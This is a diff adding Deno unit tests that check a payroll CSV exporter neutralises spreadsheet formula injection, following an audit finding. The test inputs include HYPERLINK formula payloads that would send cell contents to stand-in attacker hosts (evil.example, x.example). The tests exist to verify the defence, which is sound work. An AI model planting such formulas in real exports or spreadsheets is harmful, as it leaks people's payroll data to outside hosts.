@@ -174,3 +174,32 @@ Deno.test(
     assertEquals(normalizePayrollColumns(['version']).length, PAYROLL_COLUMNS.length);
   },
 );
+
+// W3-06 · audit "Payroll CSV does not neutralise spreadsheet formulas…" (OWASP CSV injection).
+Deno.test('csvEscape prefixes text that starts like a formula; numbers stay plain', () => {
+  assertEquals(
+    csvEscape('=HYPERLINK("https://evil.example/?d="&B2&C2,"Delta Electric")'),
+    '"\'=HYPERLINK(""https://evil.example/?d=""&B2&C2,""Delta Electric"")"',
+  );
+  assertEquals(csvEscape('+1'), "'+1");
+  assertEquals(csvEscape('-1'), "'-1");
+  assertEquals(csvEscape('@SUM(A1:A9)'), "'@SUM(A1:A9)");
+  assertEquals(csvEscape('\tTabbed'), "'\tTabbed");
+  assertEquals(csvEscape('Delta, Inc'), '"Delta, Inc"');
+  assertEquals(csvEscape(-1), '-1');
+  assertEquals(csvEscape(6), '6');
+});
+
+Deno.test('payrollCsv neutralises a formula in a company, site or trade name', () => {
+  const evil = '=HYPERLINK("https://x.example/?"&A2,"Pay")';
+  const rows = buildPayrollRows(
+    [{ ...entries[0]!, company_id: 'c9', trade: '@SUM(1)' }],
+    [{ id: 's1', name: '+Riverside', project_code: '-RL' }],
+    [{ id: 'c9', name: evil, trade: null, status: 'confirmed' }],
+    { includeUnconfirmed: false },
+  );
+  assertEquals(
+    payrollCsv(rows).split('\r\n')[1],
+    `2026-10-06,'+Riverside,'-RL,"'=HYPERLINK(""https://x.example/?""&A2,""Pay"")",'@SUM(1),6,48,RL-2041-0187,2`,
+  );
+});
